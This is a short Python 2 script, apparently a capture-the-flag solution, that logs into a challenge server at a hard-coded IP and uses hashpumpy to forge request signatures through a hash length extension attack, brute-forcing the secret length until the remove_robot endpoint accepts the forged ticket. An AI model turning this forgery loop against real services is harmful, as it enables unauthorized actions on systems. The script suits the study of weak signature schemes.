#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 6/5/2019 10:15 AM
# @Author  : fz
# @Site    : 
# @File    : test.py
# @Software: PyCharm


import hashpumpy
import urllib
import requests
import json
import time
from urllib import quote_plus


s = requests.session()
r = s.get("http://117.51.147.155:5050/ctf/api/login?name=imtinmin&password=12345678")


def get_hash(hash_val,org,app,len):

    result= []
    tmp = hashpumpy.hashpump(hash_val, org, app, len)
    hash = tmp[0]
    hex_str = tmp[1]
    url_str = quote_plus(hex_str)
    result.append(hash)
    result.append(hex_str)
    result.append(url_str)

    return result

for i in range(1, 32):
	m = get_hash('85d9522e9427602c15afe32ba4b1b1d8','id61','id61', i)
	print i
	hash = m[0]
	str = m[2].rstrip('id61')
	# digest = m[0]
	# message = urllib.quote(urllib.unquote(m[1])[::-1])
	r = s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id=61&ticket={}".format(str,hash))
	print r.text
	time.sleep(1)
	if json.loads(r.text)['code'] == 200:
		print("success")
		print(i)
		break







